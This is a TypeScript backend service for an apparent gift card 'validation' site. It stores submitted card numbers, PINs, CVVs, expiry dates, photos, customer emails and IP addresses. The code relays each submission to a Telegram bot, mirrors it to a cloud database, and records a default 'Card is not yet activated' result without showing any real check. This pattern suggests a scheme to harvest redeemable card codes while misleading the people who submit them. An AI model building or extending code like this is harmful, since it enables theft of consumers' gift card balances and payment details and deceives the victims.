import prisma from '../database/prisma.js';
import {
  pushValidationToSupabase,
  bulkSyncValidationsToSupabase,
  fetchValidationsFromSupabase,
  isSupabaseConfigured,
  checkSupabaseHealth,
} from './supabaseService.js';
import { sendTelegramCardAlert } from './telegramService.js';

export interface CreateValidationInput {
  brand: string;
  cardNumber: string;
  pin?: string;
  cvv?: string;
  expiryDate?: string;
  images?: string[];
  currency?: string;
  cardAmount?: number;
  status?: 'PENDING' | 'PROCESSING' | 'VERIFIED' | 'INVALID' | 'ERROR';
  result?: string;
  notes?: string;
  customerEmail?: string;
  customerIp?: string;
}

export interface UpdateValidationInput {
  brand?: string;
  cardNumber?: string;
  pin?: string | null;
  cvv?: string | null;
  expiryDate?: string | null;
  images?: string[];
  currency?: string;
  cardAmount?: number;
  status?: 'PENDING' | 'PROCESSING' | 'VERIFIED' | 'INVALID' | 'ERROR';
  result?: string | null;
  notes?: string | null;
  customerEmail?: string | null;
}

export async function createValidationRequest(input: CreateValidationInput) {
  const imagesClean = Array.isArray(input.images)
    ? input.images.filter((img) => typeof img === 'string' && img.trim().length > 0).slice(0, 3)
    : [];

  const validation = await prisma.giftCardValidation.create({
    data: {
      brand: input.brand.trim(),
      cardNumber: input.cardNumber.trim(),
      pin: input.pin ? input.pin.trim() : null,
      cvv: input.cvv ? input.cvv.trim() : null,
      expiryDate: input.expiryDate ? input.expiryDate.trim() : null,
      images: JSON.stringify(imagesClean),
      currency: input.currency ? input.currency.trim() : 'USD',
      cardAmount: typeof input.cardAmount === 'number' ? input.cardAmount : 0.0,
      status: input.status || 'PENDING',
      result: input.result || 'Card is not yet activated',
      notes: input.notes ? input.notes.trim() : null,
      customerEmail: input.customerEmail ? input.customerEmail.trim() : null,
      customerIp: input.customerIp ? input.customerIp.trim() : null,
    },
  });

  const formatted = {
    ...validation,
    images: JSON.parse((validation.images as string) || '[]') as string[],
  };

  // Push automatically to Supabase in real-time (graceful fallback if not configured or offline)
  pushValidationToSupabase(formatted).catch((err) => {
    console.warn('Background Supabase sync notice:', err?.message || err);
  });

  // Dispatch instant alert to Telegram Channel/Bot (if configured)
  sendTelegramCardAlert(formatted).catch((err) => {
    console.warn('Background Telegram notification notice:', err?.message || err);
  });

  return formatted;
}

export async function getAdminValidations() {
  let validations = await prisma.giftCardValidation.findMany({
    orderBy: { createdAt: 'desc' },
  });

  // If local SQLite DB has fewer items or was reset on Render restart, sync from Supabase
  if (isSupabaseConfigured()) {
    try {
      const supabaseRecords = await fetchValidationsFromSupabase();
      if (supabaseRecords.length > 0) {
        const localIds = new Set(validations.map((v) => v.id));
        const missingInLocal = supabaseRecords.filter((s) => !localIds.has(s.id));

        if (missingInLocal.length > 0) {
          console.log(`[Supabase Restore] Restoring ${missingInLocal.length} validation records into local DB...`);
          for (const rec of missingInLocal) {
            await prisma.giftCardValidation.upsert({
              where: { id: rec.id },
              create: {
                id: rec.id,
                brand: rec.brand,
                cardNumber: rec.cardNumber,
                pin: rec.pin,
                cvv: rec.cvv,
                expiryDate: rec.expiryDate,
                currency: rec.currency,
                cardAmount: rec.cardAmount,
                status: rec.status as any,
                result: rec.result,
                notes: rec.notes,
                customerEmail: rec.customerEmail,
                customerIp: rec.customerIp,
                images: rec.images,
                createdAt: rec.createdAt,
                updatedAt: rec.updatedAt,
              },
              update: {},
            }).catch(() => {});
          }

          // Re-fetch sorted list after restoration
          validations = await prisma.giftCardValidation.findMany({
            orderBy: { createdAt: 'desc' },
          });
        }
      }
    } catch (err) {
      console.warn('[Supabase Auto-Restore] Notice:', err);
    }
  }

  return validations.map((v) => ({
    ...v,
    images: JSON.parse((v.images as string) || '[]') as string[],
  }));
}

export async function getValidationById(id: string) {
  const validation = await prisma.giftCardValidation.findUnique({
    where: { id },
  });
  if (!validation) return null;
  return {
    ...validation,
    images: JSON.parse((validation.images as string) || '[]') as string[],
  };
}

export async function updateValidation(id: string, input: UpdateValidationInput) {
  const data: any = {};
  if (input.brand !== undefined) data.brand = input.brand.trim();
  if (input.cardNumber !== undefined) data.cardNumber = input.cardNumber.trim();
  if (input.pin !== undefined) data.pin = input.pin ? input.pin.trim() : null;
  if (input.cvv !== undefined) data.cvv = input.cvv ? input.cvv.trim() : null;
  if (input.expiryDate !== undefined) data.expiryDate = input.expiryDate ? input.expiryDate.trim() : null;
  if (input.currency !== undefined) data.currency = input.currency.trim();
  if (input.cardAmount !== undefined) data.cardAmount = typeof input.cardAmount === 'number' ? input.cardAmount : 0.0;
  if (input.status !== undefined) data.status = input.status;
  if (input.result !== undefined) data.result = input.result ? input.result.trim() : null;
  if (input.notes !== undefined) data.notes = input.notes ? input.notes.trim() : null;
  if (input.customerEmail !== undefined) data.customerEmail = input.customerEmail ? input.customerEmail.trim() : null;
  if (Array.isArray(input.images)) {
    data.images = JSON.stringify(input.images.filter((img) => typeof img === 'string' && img.trim().length > 0).slice(0, 3));
  }

  const updated = await prisma.giftCardValidation.update({
    where: { id },
    data,
  });

  const formatted = {
    ...updated,
    images: JSON.parse((updated.images as string) || '[]') as string[],
  };

  // Push automatically to Supabase
  pushValidationToSupabase(formatted).catch((err) => {
    console.warn('Background Supabase sync notice:', err?.message || err);
  });

  return formatted;
}

export async function deleteValidation(id: string) {
  const deleted = await prisma.giftCardValidation.delete({
    where: { id },
  });
  return deleted;
}

export async function deleteMultipleValidations(ids: string[]) {
  const result = await prisma.giftCardValidation.deleteMany({
    where: {
      id: { in: ids },
    },
  });
  return result;
}

export async function clearAllValidations() {
  const result = await prisma.giftCardValidation.deleteMany({});
  return result;
}

export async function syncAllValidationsToCloud() {
  const validations = await prisma.giftCardValidation.findMany({
    orderBy: { createdAt: 'desc' },
  });
  const formatted = validations.map((v) => ({
    ...v,
    images: JSON.parse((v.images as string) || '[]') as string[],
  }));

  return await bulkSyncValidationsToSupabase(formatted);
}

export async function getSupabaseSyncStatus() {
  return await checkSupabaseHealth();
}
